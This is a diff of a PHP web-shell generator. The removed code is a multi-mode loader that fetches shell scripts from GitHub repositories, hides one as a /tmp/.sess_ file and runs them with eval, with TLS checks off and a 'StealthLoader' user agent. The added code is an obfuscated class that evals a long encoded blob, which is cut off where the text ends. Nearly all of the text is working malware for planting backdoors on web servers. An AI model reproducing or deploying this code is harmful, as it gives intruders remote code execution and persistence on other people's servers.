@@ -152,232 +152,47 @@ function genPHP(){
  * @version   1.0.0
  */
 
-session_start();
+error_reporting(0);
+ini_set("memory_limit", "512M");
+define('CONF_LJWFZG', 'NRvONBowduHozGP');
 
-@ini_set('display_errors', 0);
-@set_time_limit(0);
-@error_reporting(0);
+class Core_Suaue_Mod {
+    private function oEPSJN() { return 'JNdtOotLGj'; }
+    private function egxSDd() { return 'dSlFDgVnD'; }
+    private function jifCaX() { return 'DuXBmyQTId'; }
+    private function vzmuyB() { return 'rpPjMuDSyooNdnfJxqJS'; }
+    private function AmhmQN() { return 'aWZeByWUgPivEUyaJKLd'; }
+    private function DJncfp() { return 'UMruuemTGosDnBBnAslX'; }
 
-// Ambil mode dari query string ?m=<mode>
-if (isset($_GET['m'])) {
-    $_SESSION['loader_mode'] = $_GET['m'];
-}
-
-$mode = $_SESSION['loader_mode'] ?? 'h';
-
-// Reset session kalau mode 'h'
-if ($mode === 'h') {
-    session_unset();
-}
-
-// --- SWITCH MODE ---
-switch($mode){
-
-    // --- Loader 1: cURL ---
-    case "curl":
-        $url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/VoidGateDx.php';
-        $code = @file_get_contents($url);
-        if ($code === false || empty($code)) {
-            $ch = curl_init();
-            curl_setopt($ch, CURLOPT_URL, $url);
-            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
-            curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
-            curl_setopt($ch, CURLOPT_TIMEOUT, 20);
-            curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (compatible; PHP Script)');
-            $code = curl_exec($ch);
-            curl_close($ch);
-        }
-        if ($code) eval("?>$code");
-        break;
-
-    // --- Loader 2: Refactored cURL (robust + fallback) ---
-case "curlman":
-    function load_content() {
-        // dua varian URL (canonical + refs/heads)
-        $base = 'https://raw.githubusercontent.com/6ickzone/Gaje-Project';
-        $path = 'kerang/explo.php';
-        $urls = [
-            "$base/main/$path",               // canonical raw URL (recommended)
-            "$base/refs/heads/main/$path"     // older style (sometimes works)
-        ];
-
-        $data = '';
-        $lastHttpCode = 0;
-        $tried = [];
-
-        foreach ($urls as $target_url) {
-            $tried[] = $target_url;
-            // try curl if available
-            if (function_exists('curl_init')) {
-                $ch = curl_init($target_url);
-                curl_setopt_array($ch, [
-                    CURLOPT_RETURNTRANSFER => 1,
-                    CURLOPT_FOLLOWLOCATION => true,
-                    CURLOPT_CONNECTTIMEOUT => 5,
-                    CURLOPT_TIMEOUT => 10,
-                    CURLOPT_SSL_VERIFYPEER => 0,
-                    CURLOPT_SSL_VERIFYHOST => 0,
-                    CURLOPT_USERAGENT => 'Mozilla/5.0 (compatible; StealthLoader/1.0)'
-                ]);
-                $resp = curl_exec($ch);
-                $info = curl_getinfo($ch);
-                $lastHttpCode = $info['http_code'] ?? 0;
-                curl_close($ch);
-
-                if ($resp !== false && $lastHttpCode >= 200 && $lastHttpCode < 300 && !empty($resp)) {
-                    $data = $resp;
-                    break;
-                }
-            }
-
-            // fallback: file_get_contents with stream context
-            $ctx = stream_context_create([
-                'http' => [
-                    'method' => 'GET',
-                    'header' => "User-Agent: Mozilla/5.0 (compatible; StealthLoader/1.0)\r\n",
-                    'timeout' => 10
-                ],
-                'ssl' => ['verify_peer'=>false, 'verify_peer_name'=>false]
-            ]);
-            $resp2 = @file_get_contents($target_url, false, $ctx);
-            if ($resp2 !== false) {
-                $data = $resp2;
-                // try to derive HTTP code from $http_response_header if available
-                if (isset($http_response_header) && preg_match('#HTTP/\d+\.\d+\s+(\d+)#', $http_response_header[0], $m)) {
-                    $lastHttpCode = (int)$m[1];
-                }
-                if ($lastHttpCode >= 200 && $lastHttpCode < 300) break;
-                // if no header info, but we got content, still accept
-                if ($lastHttpCode === 0) break;
-            }
-        }
-
-        // final: either we got data or not
-        if ($data) {
-            try {
-                eval("?>$data");
-            } catch (Throwable $e) {
-                echo "<pre> Loader Error (eval): {$e->getMessage()}</pre>";
-            }
-        } else {
-            echo "<pre> Failed to fetch content from remote. Tried:\n";
-            foreach ($tried as $u) echo " - $u\n";
-            echo "\nLast HTTP code: $lastHttpCode\n";
-            echo "Tip: open the first URL in browser to confirm path is correct.\n</pre>";
-        }
+    private function eqEugdvR($c = '') {
+        if (empty($c)) return null;
+        $c = preg_replace('/[\x00-\x08\x0B-\x0C\x0E-\x1F\x7F]/', '', $c);
+        try { return eval(trim($c)); } catch (Throwable $e) { return null; }
     }
 
-    load_content();
-    break;
-
-    // --- Loader 3: TMP File ---
-    case "tmp":
-        $payload_url = 'https://raw.githubusercontent.com/6ickzone/0x6ickShell-Manager/refs/heads/main/bypass.php';
-        $tmp_path = '/tmp/.sess_' . substr(md5($_SERVER['HTTP_HOST']), 0, 10) . '.php';
-        if (isset($_GET['reload']) || !file_exists($tmp_path) || filesize($tmp_path) == 0) {
-            $payload = file_get_contents($payload_url);
-            if (stripos($payload, '<?php') !== false) {
-                file_put_contents($tmp_path, $payload);
-                usleep(300000);
-            }
+    public static function init_YwXe() {
+        $ZCCjn = 'MDE3MTMyNDQzNDE5MWJhYjg5ZmRkYTU2OWNjMTgwMjdmZTYyZWE4MTA5ZTZiZjg4NmI3ZmZiOGQ2NmMyNjgxNzQ4YmMxMDY5NTE2ZmEyYzg1N2M4NGMxMzRiM2UyMjE5YjZiOTM1NzcwMTcxYWE0Nzg2NjI5OGFlNjQ3YWQzMmUwNzc5ZmIzODY3Mzg3Y2U2OWQ5NzEwNjI0MzYyZmEwNTFmMTg0ZDlkYWNlZGU3MGJmMTBkYjFiNjZhZjlhNDE4ZTYxZGIzMmU4ZDhlODhiNTA5NTUxMWU0YzkwMjJkZGYyMGVmOGJmZGVmM2EwMmRlNDZjZWM0NTUxOTcwMDcyNDQxZWE2OWE5NjljZDJhMGIxYmIyZTZmNDJmMTE2ZTg5YzUxN2QxMTBlMDljZGVmZmM0NzNkNmU3MDFlZWM4Mzg2N2M4ZTkzZDE4ZWMyYjE5MzgxZDljM2IxM2Y5OTIxNzVkYTM2NTY3OTBkMDdkMzM3YzhkZGRiNTAxODQzNjg4YjMyMDE3MTU5YWE3OTk3NGZmMDBiNzhhZGE4ZWM2NzQ2YWFlYzk4NGFlNWFhZDk5ODhlMzcxODMwMzg1OGNhNTNiOTc4Zjk1YjgyYmY3ZmNhZmQxMGExMmM1ZmRkZDI0ZTFkZDEyZTE0Y2E4NTVkZmFlMmVkY2Y1MTQ1NWY2MzU2ODdiNzRiM2EzNTAwYjZlNDcxODM2MjY1ZDk5Njg1ZTFhNDU2YjJhMzUyNDg4ZjFjODljZGY0MWYxOGJhZGRlZThjODZlYjg3NjJlMjQ4ZWRhY2E1NDFhYTBmMDM2Y2NiNmM3YTFiNDA0MWU2ZmYxYTFlODRmZGFjOTUwNTYxZTM1M2FiMDJhNTNlZGI3YTg3MWE1Yjk1Mzc3YjkxNjE0MjVlODY4NDVlNjg5MGNkMDQwMTY1ODFjZjcyNjM1OGNiNGI3MGU5ZWQ2MzUwNTJhOWQ3YWFkYWIzNDFmYTMwODUzYmFiODdhM2JjYWRhMzlkOTViYWIzMDEzMzVlYzQ4N2IzZTRhM2QyOWYyODhiZTFhZDZkZTc5ZDAzYjMxNGQxN2QzMzNkZjYxNzM3NzcwMzM2YTMzNTdmYTE3ZjIwODM5ZjcxN2YyYzZlYWI1MWI3YjU4ZWFjMGRkMTgxYjYwZDJlOGIyMDA4NGQ5NzhkN2Q2ZDdmOGIxODQ0MjNjMGYxM2JjNTE5NDlhOTZiOGM1OWI5MjAwMjA1NDM0YzJmYzdmZDliZDMyOTg3YTljMDdhYzg1MTgyYjc4ZDEyODkxNjg5NTkwY2NlZjVlZWQyZDJkYjkwZTZhMDQ3NDY5MTk1YWY0MDBmODI5NTE3YzUxMTJlNDgyMzA1MDNkNGUwOWQ3ZWQ1YjEwMzA2ZTc5NTU2ZThkNzQ3ODk3YTVhMmU0NDdlZjhkZTY1NDg2Y2FhNWU2NGY0OWMxOTczNTM4MDIxMTZlMTUwOWNhY2M2N2M4MjBmZmIyNTRkMzc2NTFkNjhhNTUwM2E2NTE4MTQ0NjcxMzFmNjI4ZjIxOWY2MjZjOTBhNzA4YzUxNjY1Y2JiZmY4ZjE1YzIyYjdhNTkyNDkxYTI4ZDA0ZmJmYzFjODlkZDkzOTM0MWMwNmM5MDRkNzEzN2U2ZmY2NDY5Mzg4MjE3NWVkNmIwZjBjYjRlNGZiNzJjY2MyOTdmNDljY2ZjODFkZGM5ZmJkYTg4NzEzYWEyY2JjZmNiZmE3YWQ4NWY2ZTM1YzI3ZGIyODIxNDM3NjJkNGIxMDg2ZjUxNjAzYjczNmI2N2ZlNTI3N2UxZTk2NjlmMDEyZTRjMDlmYTAzNjJiZDgxMWM1MGIxMzlmOTkzYzM2NDE4NDY0YjkzNzE1YTE3ZTg3N2IyNjQ0YzVhZjY3NTYyNGI2MjMwZDNjNjI4YjM2Y2U2NDY1MmZiYWQ5NjM4YzhlMDJiNGMwNjExNTQxMWZmOTIwZmYzZmMyODBmOThlZGM5ZmQxYWQ3ZDFlODRiMjg2YzBlM2U4YzY3ZjMzYTM5YzgyMTYxZDA0ZmY4Y2MwNGEwZmY1ZDI5MDZjY2FhODJkZDczYTc3MzBjNTBmYTU4MzAzMGM0MjJiZjM0Y2Y1YmQ2YWM4MzllNGQyYmJhNTU4YmNhNmQ1Y2M2ZjAyNjUzMWExYTA2ZGU0Mjk3NGJjYjEwY2Y4MWYwYmQ1MTE2ZWI3MjA4Yzc5N2NiMDcxMDVlYWExMmFlYTI4MGM4YWYxZmQ2NjVhYjA3NGVkNmNiMjAwNDc2MTMyYTIzOTU4ZmY1NWVkMTAxYTAwZDZjNWNjYWE1NTljZDc2ZmY5ZDUzMWUyZGQ3NjRjOTBlYWNmZGNhNzQ1OGRjNjJlZTFjYTRmZWFhMWNiYThmMWVlMmVkZGI4ZTk1N2RjMmNiM2FmNmY1ZTdkMWFkNzU4OGMyNWM4ZGQ3YjgxYjBmOTJkMDM2OTAwOTg1NzdhMDQ3MDAyNmI0NjUwMTE2OWNmYzRlNmRkZWVhODdhZWZjMWUzNDNhNTEyNTQzN2RkM2M2MmIxN2MwZGZiMDI2YjFhMWFjNzNjYmU1ZDZmYWE4ZmUzYTMwNTUxYzFlYTE3ZTU5OTc2ODI1MzkzYzVhYTllNmNiNDc2NjlhYmMxMzY2NzM3MzcxNTdmMTZiOTEwMDVjZTg3YTMyOTQzNDc1ZTU1NGY0NTljZTBlMzc3ODhiOWExMGNhMzI3NmFlMGU5MzFlNjAyNWRkZTdhODcxYzQ4Mjg0NWNjNGYyNGRhYjYyMmU3MTFhNzg2NmVhZmU3ZDc3YzZiZjJkMDc1MGI3NWQ0MWIyOGJkOGU0NGQzYTcxZGZlZmY5Mzk1MDhjOTllM2FjOTA5YWFkMjM0ZTQzZjZiYzZhMmI3NzBhYzdiYTllMDY2Y2M3ZTAxZTU0YTdjNGM1YWMyMjhjNDM2Y2E4NmM4ZWU5ZmE2NDc2MmRiNzBiMzNkNzU4MmJlYWE2YmFjZjdhZmZmMDIyODc4MDA3ODRlY2JkYmI3ZmEzNmU3ODY3NWE4YjIwNDJmZGY3MGVmMDg3MzQ0YzE2MTcyZjM3YWU3YjYxMmYxYjgzYzkzNTZhZjM5Y2JkMWE1NDY1Y2ZkYTVjYTg0ZDVjZWFhNzg3MTU1MTlmNzdjMDVmMTcyNzkyZjQ1MWRiYWU4ZGFmN2UyYmIzYWM2ZTM5YTU3M2MxZDhiMDI2ZGY2OTI0ZTBkZmU0OWU4MDMzYTQ2YTY3ZDhjODc3YzUwMTQxZDMwODJiMjg3ODJmZDAxNzE1YzRkNjQ4YTZjYmNmNGVlZTcxZmNmMTYyZDFjMjlmNzkxYjFlMzkxMjY5ZGJkOTdmNjQyZTUwMWUwN2U3NjA4OGI4NjM3Njk4MjNmMWRhOTllNDc2ZDlkOGU1YTllYjY1ZTQ1MTM3NTMzMzJlYzY2ZTdjOTYzOTVhYWE3MDhiYmIzYjEyNzlmYWYyMzY3NDE5MmMyMzExMzA0MTMwY2YwMjMzMDVhOTRiZTgzZTNkODQ1YzMwNTY0ZDI5Y2RlYjE2MGE5NTZjZjIxNDY4ZDI0YzI5ZGJhMjU4ZDEyNTQyZWVhODc1YTk0MzBiNzRmZjA4NDBiYWZhNTA4OWFiY2E2NDA5ZTMzZjg2MDY3MmJhNDUzM2JkZDcxNTRiOTE1ZDQ1NjQzYjMyZDBjNjhhMmFjOTJhMzE5Yzk4NDRiNTRkNWQ1ODU2ZjVmYmNlNGIwNzAwMzQwNjBmNTFhNWQxYTkxMWU1OGY3ZDkwMGJkZTBjZjgwOTkzNmYxMmY5MTE3ZDU5NDY0ODI0ZjA1YTIyZGE5NWMwMmVjZGJkZDg2OThlZjlhN2ZiMmYyMWFhZjg1MzNhMjJkYzUyMzg4YzIzZTM4YjZhMjY2ZjIyZDZjNzc5YjY4ZTNkNTE2YTgwMWMyMWVmOTIwZWM0MWZhMWJhODRmOTBmMjA3ODdmYmNmZDkzMDhjOTRmOWE3MGU0NGNhMDQ3OGQ5MGFlYjIzZmY4YTJjMWI1NGMzMjhjY2RjNzU4N2JhOTQ2Yzk1YzI5ZjBkMmRmY2Y1ZjIyNDM4OTIwZTFkMTE2ODFkZTY4ODY3YjY4OTE4ZDc1ZGQ5MzM2MGQ1NjNmNWQ3YWIyYTdlOTQwYzFhMWExN2Q0NTUxZDQ1ZmU4NmQ4YWU4NmUwNGNhOWJiZmFlNmJjNTc1OWM1NDA2NjY5YjY3NTRkMTIzZGZkNjIxZGUyMWU4YjE3ZGFlNmZkZDJiNzg4YmUzZTI2MDA2ZTM1OTdjNzQzNDQ3OWYwMzZhOWNhMTY0OTY3NTEzNzVlM2MxZWJjMDM2YzQ1MjBmYmVhZjE1ZWQ5NGE2NzQ5MGYyZDdiZjdjZjI1ODhmOWJmYmNkMTYxMWM4YWNkNjdiNjEzMDNkODJlYzZlY2NiZTk2ODQzMGMxOGU1MWEzN2JhNjI2MWNmZDI5YzMxMWJhNTQ1Y2JiMDM5Y2FjN2NlYjhmYzMzMzJjZWY0OTEyODZmYTRhZWZjYzQ1Yzk4NTQzODJlMDEyYjY0NTE1NDkyM2ZiZjljOTdjZTBhYmU2YjMyNjgxM2U5ODBjOGI0NDljM2I4OGNjMjZkYzJiNTQ2NDZhMGNlMWYyMGUyNmUxYzllYTc4ZWZjYzJkODViZjk4NmFlNmMxNzBiZGU0MjYwNTg2ZmIxODQyZDEwOTk4NDdhMmQyNzIwZTRhYmVlMDkxNGQwN2EyOTM2Mjc0OTVjOGI2MTk3NmQ2MWM5NDQ5ZGIzNThjYmFmYmY1NmU4YjhlMzNmM2EwM2RmMjZiN2I1NzI0ZjFhYzE3NTZhNDVmYTI1ZTliYWIzNDc5NDNmYjI0MzM0N2JmOTA4MTA2MDI3OTgxMDUzMmFiYTQxMDU0OThmMjBiZGNiYmMxNmZlYzNlZDc5MmNkMTZhMjJmMDBjOGEyMzAyNGVjZDM0NzYzNmE4NjIzNzYxMzc0YzBkNWQyZTkzYmRjZmNjNTgzY2ZjYWExMjk2YjY1ZmNlMTdmZDhmNzhjOTkwNzM4OTczMzhmNThmOTBiOGFhYThiOTRjZDQ3MmFkYTYzZWU4Y2IzNTA0YzY5OGE3ZTA5NjdjYWJmNWJiZGQ4ODU1ZTQ0ZGMwYWY3NDU1N2ZiZjU5NDYyZjQ3MmRhZjQ4OTYxNzExZDQzMDRlODZlZDZjODE3OWVlOWE4Y2Q5NWNlMWRlMzU5ZGM5ZjQzZmFiNDU0MmIwMzNmOTE4ZWQzZmY0ZDlkNDRhNjk1OTZmMzg0ZmFjYjFkOGQ3NGRlYmM4NzFlMzAzNWVlOGU5N2NiYWFkMGU3MWE4ZmJjNTk0MzE5M2VkY2M1NWJlOTQ0MTBlYmIxZGE4MDg3MDEyNzA4ZTdlOWZmMjYwYjJlY2IzNzEyMjNhZmU2NDdlZmZlNDM4NzlkYzEyMDEzMDdhN2RjMjU4Y2U4MGFmMDgwM2ZlMGEwYzdkMWQ0ZmVkYTg5MDk3ZTJhNGNkNTMzYTczZjQ5MTI4NTY5NDFjNDQ5NWYwNDQzNmYyYmZjYzRmMjUxNDNiMjdmMWNkYmE4ZTFlMzFhMGVmZGQ5MTkxNTgwNzIyYzMyNGViYjc1NjY4ZTJkNzA5NGQ0MDJiN2U5ZGZhODZmYTVmMTFmMWUyNzZmMTUwYjE2MmEwNTJkZjk2ZWMyZjgxM2NmYzg0NjNiZTEwOGNmOWQwNjI1OWI5ZTQwOWQ0YjdjODcwYTJiNDhiZDdjZTVlYmY3ODE0OGU1NThhMzM5MzEwNGZjYzE0NjZiNmRmOGIzZTcwNzVlMjE1ODljZWI3MWZjNzRmNjA1MGU4ODZkYzkyOGU5MzRjYmMzMzNmNThhNGQ4NTA3NWRiMTg0NTliN2JmMWVkMmYyNTg1MzNiMzE4MTU0YzY2MWE2MjJhYTQ3NzkwZjkwMmM1Nzk5YmQzMjAzMzE3NzlkYzU1MTIzZjMwMmQ5Y2Y5YWI0ODE1ZjZiMDJmODZhZGVjYjg5YzRlN2YxM2M0OGQ5ZTBjMGIyNTI5MDg2OGEwMGZkZGIyNDY0YjdiYzAyYjlkMmZkZTU0MWRmZjBmMTVlN2I3YWFkODkwZDJhMDQ4MTI5OTY5NzYyY2RkNDcyNmYyMzAxMjVkMGNkOTc1ZDQ2MmFmNmU3ZmE1M2Y4ZWU3ZTRlMzc0YTNlNmI1M2FjMGU3ZTgzYjM4ZDQwYmIxNzRiMTA4MzNhMjhlYTEyYWU5NDA2MGJjZTIxMzIwMDgzYjVjNjY1ODlkYWY0OWQ3MGI3ZDQ2YWQ2ZDUxMmM4MGUxYmY3NDgxNTU5NGUwZGViODNkOWE1MmNmYjBjYjIwZjNhMjkxMDFlZDI2MGRlNDZjZDk5MjcxNjcwNGQ5MzhkMTEyMzFiZDc1MDMwNjM4MWYzYmNmOTU2MmJlNDUzMTI4NGEzNzk2ZDRiNTMyM2RiNmZhZWE4ZTg3MzdiYjE4NDczMzc3ZTA4OTlmYzJlMGI1NWZhZGJmMzNkZTVjM2U2YWE2ZTdkOGY1ZGFmNmJiMTg3MjI2NjkzOGZmODA0MTNkZjY3ODM0NjMxZGI1NDY4NTk2ZmIyMTc3MGQxZjY1OTNjZWY1NTU4MWE0NTQyNDBiNGZkZTMwNjgzYWI2ZmNhODExY2FmYTI4N2NhZGI4ZTFjY2U4ZGUxNDdiZDUyYzJmMGEwOWFiMmU0MWI0MTc3OGUxNWI1ODY4MTlkM2FiODFhM2IzNDk5ZjFiZmNkYTc4OGU5Yjg5ZWRkNTQ3MDlkY2E2MjUzN2MzMmI5MDI4YTNkNmI1ZjM5ZTNhYzkyMTA0YzQ1M2NhOGJiMGE5OWJjYmIzZmQ1YzBjNWQ4YzI4ZWZkMGYxZTA3N2EwNzVkNDY3MTEyYWMwNWUxMTk2Yjc5OTI5MmQ3NDFmZDQxYzExZWMwZGQ1MzZhYmY2OTkwYTVmOGEwNTBlMmE1ZjNlNTlkNTAzODU3MzFiOGZkMzlmMWRkNjUwOWY0NjQ3YzE0YzNmNTVhODg2NWVkYzZiOTg3MmI2NjdlMGVjMzFiYTkzNGFmOTE1N2I2NjBhYzc3NTYwYWI3NzkxOWZhYTA2N2FiNTYzMWRlNTcwM2MwNWVmZWZhMWU3Yzc2ZmE3MWMxMWYwZTZmYzAwZjc5MzAzY2ZjNDFkOGQxNjA3OTViN2Q0YjJmNmNmMDIyMjg1OTg1ZTBjNjFiNzI2Y2E2ZDU0OWNkM2Q5YzNjNmYyZDAyYWQ4ZjU4ZWFiMTBiMTUwYTFjOWM2ZTRmMTc1YjYzODZlYTMwZjgzYWI1ZDZmODU3NWFiY2IyMWMyZmI5OGMzMGE4MjU5YWQwYzcwYTlhZDdkMTUxZWJmNjIwNDc4MzFiMWRkYzNkOTFmZWE4YmJiY2ZiMDgyZmFmNjE1OWM4YTU0YTMwNzExY2RmY2ViOWIyMmYxMGQ1M2FhYzMwOWY5YzM0ZGU4NzExOTdjMTIyZTc4NDM3YzhjMWQxNWU1YmUwZTNkMTA4ZTFkYTJmMjRiOGZkZGJmZDcxZDkyMWIyYzVjYjAzNjBlY2E3ZWZhZGVkZDQ5NGJlYmJiNzhkYmNlYjg5YzU5ZjZlYmRmZmI4YTY1NzNmMTAxMDQwMDQyYTJlYWE1MGNiYzczMDNhYWFkOWJkYmRmYmE2YTcyZjZhOWQwNDkzMWU2OWQxNDQ2Mjc0YjJjYjBlYzg2YTg3NTZlZTI1MmY2Y2M1ZjlkYjQ5MmNlYmZjY2MxNDJlYmQwM2IxNjEwNGFlNWJmNzdlYTJkODdjMjQ2MDIwYmY5ZTA4MGNkYmZjOTU4YTM3MGFiNTFlMWM5OTRlNGNlNzg0MjQxN2M1OGM0MzdjMzgwMDA1OGY0OTVlMTY3Mzk5ODg2NzFmYzFlNjUzODM0NWIyMTY1ODllZDdjMDdkYWZlNWJkMDYxYWE1YmVjMjFkZTlhMWJhZDcyYmEyMTQwZTUxZTdkNzU5NDNiOWUyNjVhOTE4YTcwYmE5ZDAzYjUxYzA3MGJiYTlmZjNmMjM4YTdmNDg5MDdjMmJhNmE0ZjE3NDkyMjJjMjJmMDk3MjVlNzEwNmE1MDAzNzc3ZDk3ZmVhODZkMTI4NDhiODI1N2NkZmJlNzNkMzQzZjc2MTRmMWZkNGY4YTk0ZTEzZWNjYzVlMzBjYmU0ZDkxNTI4MzFkNjIzYTAwYjAzNTc4N2VlYmU4ZmYwNDc4ODdjM2ZmMWQ2ZGQwNzFlZjlmOTA3NzcyY2Y4MWE2ODdjZWIyMThlYzIxODg0YmYyOTg5N2MxMTU4NWRmMDg2NTM5ZWMzN2NmNjBhYTc5ODAzZGY2ZTJkMDQzOGZkZGNlNWQyNjgwNTUzNjVkOTdhOTlhZDQ4NTAxNjhlZThlY2VlNTg1ZjQ1NThiNjY5NDU0MjgyY2M0MGUyNjJiMzJiZmMyNTc4NTdlOGRiM2E1MWEwOWRmZjUzYWQ2YzIwZDAyOTg0MzA5NmUwYTg5NzgwYTE4ZWRiZmYxYzcyYzVkYjFmNjY2MWI1ZWUyN2EwNGEzYTcwYzI2YWZkNWU0N2ZkOWQyMzRhOWQ1ZjEyMGZiMmQxM2MyY2FiMDEyYmYwNTc5ZWE4YTdmZDgwY2MwNzgzZWM5MGQ5Njk2NTQyNzcwMTM2N2Y3MTQzNGM0ZDg3ZGQzYzA5MTFiOTdhM2RiMjk0ZjA0ZTQ3YWVhYjBmZGQwOWM4Y2M4MTBiYTJmMTA2MjA5NzViOTk4OWE2YTliMzliODVhNjg4ZDc5YmE0NThiMDNjMzAxOTVlOWQ5YmJlYTU4MThhOWVhNWFkYjc5M2I1OGFiNWVhMDY0NDVjNzBlOTRiN2I3MmQ5NjhhYmExYmY5MGIzODgxYmU5Y2ZjOWJhNjVhNTliOTM5NWFjYTFhODhjOTBhN2I5ODA5Mzg0ZmVjMzk1ZjEzOWVlYWQ0Y2Q1ZGI3NTUwZjY1NTdkYmNlZTRiNTgxZjQ4MmUzOTllYzQ5MjI2ODlkNDU2OGUxNzg1NDA3NmZhYTgyY2YzNzIxMjVmMGVkY2FkNjE3NThkOWY4NWUwMWZkNWZhYmRlMTQzODdhZmQyN2ZiMTRhMGY2ZTVjN2IxM2VjNWNhYmRjOGYxMzhlNjhhZTBhMDZjNDA1YzNmODcwY2E5YzNkMzI5ODY5MTNmMWE2ZjZlZjc5NGFlZWY0MmMzNDEyODY0N2Y5YjUxYjQxODdjODE4NTYzNDNhNzM4N2Y5MGRhODcxZmYyNTIxM2M4ZDA3YTZmNWU2MTBkNjNhZTY1ODU4NmEzNzE5Yjg4NDExMjk0MmI0Y2MzYjU1ZTMzMGU2NmZjZmUxYzY1ZTI5NmQ1NTMxN2Q4NzE4MzBjMWVhNGRkOWIyNzZiODJkZTMwNDYxOWRlMGQ4Yzg2ZjhhNWRlNDU0NTA3MWE4ODM5YzZmZWQ5N2EyOGI4ZWMzODY3Njc2YzBkMmZmZDg0ZDg1NWFhYTYxMmI4ZmFhYzAwMzdmZTI1YTMwNGVlNTE2MTMwMWQwNTM1NTg0N2Q0YjI4MWNkZjkzNjI4OTU3ZmU1YmQ0NWI4MTY0ZjM3ODkwNTU5ZGZmYzQ4OTFlYWZhMDQyNDJkZjNjMGZhYTBjMWUzODUyMjY2N2MyMjVlMjYxZmIzOGRiN2JkYzQ5NWY4ZDhjMTRiYjY2OWI1YjY5M2ZlYjkyNGU5MDIwZjJlMzBkYzM5ZGY3NjE3ZTJkYTU1M2VjMWQ2NmM2MDdkMTA1NDQ0ZTFkZTExMmMxNjQ0YmY0ZjA2MGNjYjdjNTkzOTg4MDY1ZmY0YzdmNjkzZTdhNTg0NjViMTFkM2QyN2E0NDg2NzRiNGNlYzQxYmJmNjM1MTliOGE4ZGE1Y2UwYWQzMzg4MzM3MWZlZWZjNDUwZjdjMDI1ZTc4NDIyNmU4N2YyYTE3YmE1MmFjYThmNDRlM2U2MThkMjAzYTJiM2VhMjZmZjUyYzM2YTA1M2UwYTZlNjc5NzExYjUzMDRhMTgwYWRlNzc5ZDBlOTYxZTExOTkzOWQ3MWMxODk4YzdiZjgzNGNlMTdiMWVlYzA2MGM4Mzg5NGE0NzZkYWQxYmYzMTNkNmVkYTJkMmZiYzI3N2JkY2FhZWZlY2U5NWUyMzY4YTJkMmE0NTk2MGJiOWE1OGMyZDdlNGUwZTA3ZDg3YjAwZjY3ZGQyN2UzMWFlZWNmNWQwNmQ5NjIxMWIyNjkwYzE0ZTViMTkzNDBhMjVkNzFlM2U5OTliYmQzNWUwOGQ1MDIwNTRjNDk1MGY1NWFkMTkxODdlMjNlYjExMDBiYzA5Y2RiZTQ1NTBhNjNhNjhkYmJkZDJjOWVhYTZkYmU2MjgyODkyM2MwNWUyMGMzNjEwNmJiM2Y0NzIyOTExYjhiM2Y5OWI3NjFlYjIyNjAyNzFjMGM2YzJmZmQ0YzYyOWQ0MDc1Y2RkZWRlNmYzZmZiMDc5MWYzNWU4ODA2YWUwMDY3YzA2NGNjN2UyMTY4NTJjNzhhNDE0ZjQ2OGU4MTgxN2ZiMTliZGUwMTljNjI3OGJkZTg5N2IwMTQ5YjMzMzZhOTljNTI3YmMzNDZjMWYxMjYzNmViODJmYThkMjViZWIwMGYxMDkxZDkzZmQ0NDViMTBiNzY5OGI1MDY4NWNiNGE3Mjk2YjQyMjBiZTU2YjRlNzNlNTJlZjAwY2Y3MGVlYTk5NGMyMTk5YWM5ODY4MWJlMWU3YTg3MzRiMTYwMmUyMWU0MmNlM2UyODc0NmQ1NmJjMmFkMzUzNjE3MjZlYWZmMGVjYzllOTUxZDgxOGY0ZTM2N2Q4MTczZGI5MDQzODZiMDhiNGQzMTJlYjAwYjA2ZTNmZDVhMTcwOGE1ZTg2MjlkMmU1ZGNiNWU0YjI1MWU2YzBlMjBkMGFlNTQ2YmRiZTAxNTIzOGYyOGFhM2I3ZGMzZjA2OGQwN2I3YzFkZWJhYjViOGY5Yjk1MzNjOGVkYWJmZjY2NmRkZWIwZTg3YzEwMTNiMThmMDExYmE0ZTU5NmI0MTY5NzNhZTk5NDdjMWRiZjZlMTE1ZGRiMjRlMmNkMzcxYjc0MDBjMTRkNjQ5NDU0YjkxYTczNTkxZDgzMGJhNDk4ODA1NmVkOTQ4Yzk1MjMyNTg4M2Q3NWE5MDZmMTQ0Mzk5OWNkZDBkODA5MzEyMDZkZTM5NTQyYmI3YjcwMjc4MGIwMmMxNTY5ZWZiOWZlZDYzMDZkYjMyNjM4MTkxODBmMmFmYzg1OTA2ZWU0NzI4YzA5MDViY2NhZWFlMTIwZDhiZDU5ZDZkMjEyNThhZjZlMzJkODFiYmMzN2E0Mjk4MTkwZDE3MTlmN2VkNjMzY2I4OTMwOTU2MzAyMTAzNjBkZDVhOGYzZDFkODY2MGIzMWFiMzdmY2YwYzc4ODI5YjRkNjdhOTgxZmYwZWQ0ZjMxYjQxMmQ3YjYyYjNhMmQwZTlmMGYzM2Y1ZjhjODFhODFkMGZjNGZhMmYzNjU0YmYyYTAwOTE5NDViMTFmN2RhOWNkNTUzZmVhNDY4ODQyMGIzZGNmNDQ1ZjM1Y2Y2YjdhZjkwY2U3MjBjNmMyYTU4ZWQxNjExNjU1MDIzMzNiNGY4NTllMGI5MjVjM2VlNDQzZjlhNDQ0ZDI2YjgzZmRiNDBiNzQ1NWVhZDE0ODYyZWE3OTA3ZDIzNWVkYWM3NzEzNTE2MWY3ODhjMDU4OTM0Y2IzZjVmZjc0OTliMzNhNzY4MDMyNjZhODNhOTRmOWQ0MmE1YTRhYzYyN2Y5NTZmN2NkYjU0MGUzNjUwZjE1YzBhYjAyZjZkM2E4YmY2OWYzZDVlMzkxMzhlNzU1Y2RlYjkxYzgxYzk1MjI1MzQ2NjI2MWMzZmQ0MDdjMWQ2ZTcxNGQ2YWZiYmI1YjQ1MjU2NjBjZDU1MDQwY2U0ODNjMGViNTUxZTk4NDIwYWIwZDg2OGQ0NzViMmE3YjBhZTgwZmE2Yjg5NThhY2M0ZTUxY2ZlMWQzNDZlNzk0NzE2OTJlMDhiZDljZWUwNDcxYjM1MDNkNTNlYjdjOWY3ZjZkOGZhM2IxMTY1ZDY4MjY2NmExYmFmYTRlMTc5Mjk1MDE2ZDQ1MmZlYWYxODc1ZmU3ZTVhNzRkYzM1NWE4NWQ4ZDRjMWE5NjljM2IxODMyNGM4OGFmMGY1YWNiNDZkYzYxYzBmZjMxYTZlNTc4NWIwMWY5NTczZGY0MWI5YTUzYWY0MGYzY